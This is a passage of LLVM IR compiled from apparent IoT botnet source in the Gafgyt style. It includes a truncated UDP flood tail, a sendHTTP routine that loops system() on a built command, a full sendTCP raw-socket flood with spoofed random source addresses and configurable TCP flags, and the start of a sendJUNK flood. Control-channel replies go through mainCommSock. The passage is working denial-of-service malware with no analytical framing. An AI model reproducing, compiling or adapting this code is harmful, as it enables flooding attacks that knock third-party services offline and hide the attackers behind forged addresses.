  %218 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon.2* %219 to %struct.anon.3*
  %221 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %220, i32 0, i32 0
  store i16 %217, i16* %221, align 2
  %222 = load i32, i32* %8, align 4
  %223 = icmp eq i32 %222, 0
  br i1 %223, label %224, label %226

; <label>:224:                                    ; preds = %212
  %225 = call i32 @rand_cmwc()
  br label %231

; <label>:226:                                    ; preds = %212
  %227 = load i32, i32* %8, align 4
  %228 = trunc i32 %227 to i16
  %229 = call zeroext i16 @htons(i16 zeroext %228) #13
  %230 = zext i16 %229 to i32
  br label %231

; <label>:231:                                    ; preds = %226, %224
  %232 = phi i32 [ %225, %224 ], [ %230, %226 ]
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.2* %235 to %struct.anon.3*
  %237 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %236, i32 0, i32 1
  store i16 %233, i16* %237, align 2
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 3
  store i16 %239, i16* %241, align 4
  %242 = load i32, i32* %22, align 4
  %243 = call i32 @getRandomIP(i32 %242)
  %244 = call i32 @htonl(i32 %243) #13
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 8
  store i32 %244, i32* %246, align 4
  %247 = bitcast i8* %144 to i16*
  %248 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 2
  %250 = load i16, i16* %249, align 2
  %251 = zext i16 %250 to i32
  %252 = call zeroext i16 @csum(i16* %247, i32 %251)
  %253 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 7
  store i16 %252, i16* %254, align 2
  %255 = load i32, i32* %27, align 4
  %256 = load i32, i32* %14, align 4
  %257 = icmp eq i32 %255, %256
  br i1 %257, label %258, label %264

; <label>:258:                                    ; preds = %231
  %259 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %260 = load i32, i32* %26, align 4
  %261 = icmp sgt i32 %259, %260
  br i1 %261, label %262, label %263

; <label>:262:                                    ; preds = %258
  br label %267

; <label>:263:                                    ; preds = %258
  store i32 0, i32* %27, align 4
  br label %211

; <label>:264:                                    ; preds = %231
  %265 = load i32, i32* %27, align 4
  %266 = add i32 %265, 1
  store i32 %266, i32* %27, align 4
  br label %211

; <label>:267:                                    ; preds = %262
  %268 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

; <label>:269:                                    ; preds = %267, %116, %108, %103, %66, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %9 = load i32, i32* %4, align 4
  %10 = add nsw i32 %8, %9
  store i32 %10, i32* %5, align 4
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.39, i32 0, i32 0)) #4
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = load i8*, i8** %3, align 8
  %15 = call i8* @strcat(i8* %13, i8* %14) #4
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %17 = call i8* @strcat(i8* %16, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.40, i32 0, i32 0)) #4
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  br label %20

; <label>:20:                                     ; preds = %24, %2
  %21 = load i32, i32* %5, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = icmp sgt i32 %21, %22
  br i1 %23, label %24, label %27

; <label>:24:                                     ; preds = %20
  %25 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %26 = call i32 @system(i8* %25)
  br label %20

; <label>:27:                                     ; preds = %20
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare %struct._IO_FILE* @popen(i8*, i8*) #5

declare i32 @system(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %339

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %339

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #4
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i32 0, i32 0))
  br label %339

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %72

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 32, %67
  %69 = shl i32 1, %68
  %70 = sub nsw i32 %69, 1
  %71 = xor i32 %70, -1
  store i32 %71, i32* %19, align 4
  br label %72

; <label>:72:                                     ; preds = %66, %65
  %73 = load i32, i32* %13, align 4
  %74 = sext i32 %73 to i64
  %75 = add i64 40, %74
  %76 = call i8* @llvm.stacksave()
  store i8* %76, i8** %20, align 8
  %77 = alloca i8, i64 %75, align 16
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %21, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = getelementptr i8, i8* %80, i64 20
  %82 = bitcast i8* %81 to %struct.tcphdr*
  store %struct.tcphdr* %82, %struct.tcphdr** %22, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %85 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* %19, align 4
  %88 = call i32 @getRandomIP(i32 %87)
  %89 = call i32 @htonl(i32 %88) #13
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = add i64 20, %91
  %93 = trunc i64 %92 to i32
  call void @makeIPPacket(%struct.iphdr* %83, i32 %86, i32 %89, i8 zeroext 6, i32 %93)
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  %96 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon.0* %97 to %struct.anon.1*
  %99 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %98, i32 0, i32 0
  store i16 %95, i16* %99, align 4
  %100 = call i32 @rand_cmwc()
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 2
  store i32 %100, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.0* %106 to %struct.anon.1*
  %108 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %107, i32 0, i32 3
  store i32 0, i32* %108, align 4
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.0* %110 to %struct.anon.1*
  %112 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %111, i32 0, i32 4
  %113 = load i16, i16* %112, align 4
  %114 = and i16 %113, -241
  %115 = or i16 %114, 80
  store i16 %115, i16* %112, align 4
  %116 = load i8*, i8** %12, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %155, label %119

; <label>:119:                                    ; preds = %72
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -1025
  %133 = or i16 %132, 1024
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.0* %135 to %struct.anon.1*
  %137 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -257
  %140 = or i16 %139, 256
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.0* %142 to %struct.anon.1*
  %144 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -4097
  %147 = or i16 %146, 4096
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.0* %149 to %struct.anon.1*
  %151 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -2049
  %154 = or i16 %153, 2048
  store i16 %154, i16* %151, align 4
  br label %232

; <label>:155:                                    ; preds = %72
  %156 = load i8*, i8** %12, align 8
  %157 = call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %157, i8** %23, align 8
  br label %158

; <label>:158:                                    ; preds = %229, %155
  %159 = load i8*, i8** %23, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %231

; <label>:161:                                    ; preds = %158
  %162 = load i8*, i8** %23, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %173, label %165

; <label>:165:                                    ; preds = %161
  %166 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = and i16 %170, -513
  %172 = or i16 %171, 512
  store i16 %172, i16* %169, align 4
  br label %229

; <label>:173:                                    ; preds = %161
  %174 = load i8*, i8** %23, align 8
  %175 = call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %185, label %177

; <label>:177:                                    ; preds = %173
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.0* %179 to %struct.anon.1*
  %181 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -1025
  %184 = or i16 %183, 1024
  store i16 %184, i16* %181, align 4
  br label %228

; <label>:185:                                    ; preds = %173
  %186 = load i8*, i8** %23, align 8
  %187 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i32 0, i32 0)) #10
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %197, label %189

; <label>:189:                                    ; preds = %185
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  br label %227

; <label>:197:                                    ; preds = %185
  %198 = load i8*, i8** %23, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %209, label %201

; <label>:201:                                    ; preds = %197
  %202 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.0* %203 to %struct.anon.1*
  %205 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -4097
  %208 = or i16 %207, 4096
  store i16 %208, i16* %205, align 4
  br label %226

; <label>:209:                                    ; preds = %197
  %210 = load i8*, i8** %23, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %221, label %213

; <label>:213:                                    ; preds = %209
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -2049
  %220 = or i16 %219, 2048
  store i16 %220, i16* %217, align 4
  br label %225

; <label>:221:                                    ; preds = %209
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = load i8*, i8** %23, align 8
  %224 = call i32 (i32, i8*, ...) @sockprintf(i32 %222, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i32 0, i32 0), i8* %223)
  br label %225

; <label>:225:                                    ; preds = %221, %213
  br label %226

; <label>:226:                                    ; preds = %225, %201
  br label %227

; <label>:227:                                    ; preds = %226, %189
  br label %228

; <label>:228:                                    ; preds = %227, %177
  br label %229

; <label>:229:                                    ; preds = %228, %165
  %230 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %230, i8** %23, align 8
  br label %158

; <label>:231:                                    ; preds = %158
  br label %232

; <label>:232:                                    ; preds = %231, %119
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 5
  store i16 %234, i16* %238, align 2
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 6
  store i16 0, i16* %242, align 4
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.0* %244 to %struct.anon.1*
  %246 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %245, i32 0, i32 7
  store i16 0, i16* %246, align 2
  %247 = load i32, i32* %9, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %251

; <label>:249:                                    ; preds = %232
  %250 = call i32 @rand_cmwc()
  br label %256

; <label>:251:                                    ; preds = %232
  %252 = load i32, i32* %9, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #13
  %255 = zext i16 %254 to i32
  br label %256

; <label>:256:                                    ; preds = %251, %249
  %257 = phi i32 [ %250, %249 ], [ %255, %251 ]
  %258 = trunc i32 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 1
  store i16 %258, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = call zeroext i16 @tcpcsum(%struct.iphdr* %263, %struct.tcphdr* %264)
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.0* %267 to %struct.anon.1*
  %269 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %268, i32 0, i32 6
  store i16 %265, i16* %269, align 4
  %270 = bitcast i8* %77 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %279 = load i32, i32* %10, align 4
  %280 = add nsw i32 %278, %279
  store i32 %280, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %281

; <label>:281:                                    ; preds = %334, %333, %256
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %17, align 4
  %284 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %283, i8* %77, i64 %75, i32 0, %struct.sockaddr* %284, i32 16)
  %286 = load i32, i32* %19, align 4
  %287 = call i32 @getRandomIP(i32 %286)
  %288 = call i32 @htonl(i32 %287) #13
  %289 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 3
  store i16 %292, i16* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.0* %297 to %struct.anon.1*
  %299 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %298, i32 0, i32 2
  store i32 %295, i32* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 0
  store i16 %301, i16* %305, align 4
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.0* %307 to %struct.anon.1*
  %309 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %308, i32 0, i32 6
  store i16 0, i16* %309, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = call zeroext i16 @tcpcsum(%struct.iphdr* %310, %struct.tcphdr* %311)
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon.0* %314 to %struct.anon.1*
  %316 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %315, i32 0, i32 6
  store i16 %312, i16* %316, align 4
  %317 = bitcast i8* %77 to i16*
  %318 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = call zeroext i16 @csum(i16* %317, i32 %321)
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %25, align 4
  %326 = load i32, i32* %15, align 4
  %327 = icmp eq i32 %325, %326
  br i1 %327, label %328, label %334

; <label>:328:                                    ; preds = %282
  %329 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %330 = load i32, i32* %24, align 4
  %331 = icmp sgt i32 %329, %330
  br i1 %331, label %332, label %333

; <label>:332:                                    ; preds = %328
  br label %337

; <label>:333:                                    ; preds = %328
  store i32 0, i32* %25, align 4
  br label %281

; <label>:334:                                    ; preds = %282
  %335 = load i32, i32* %25, align 4
  %336 = add i32 %335, 1
  store i32 %336, i32* %25, align 4
  br label %281

; <label>:337:                                    ; preds = %332
  %338 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %338)
  br label %339

; <label>:339:                                    ; preds = %337, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #4
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %226

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
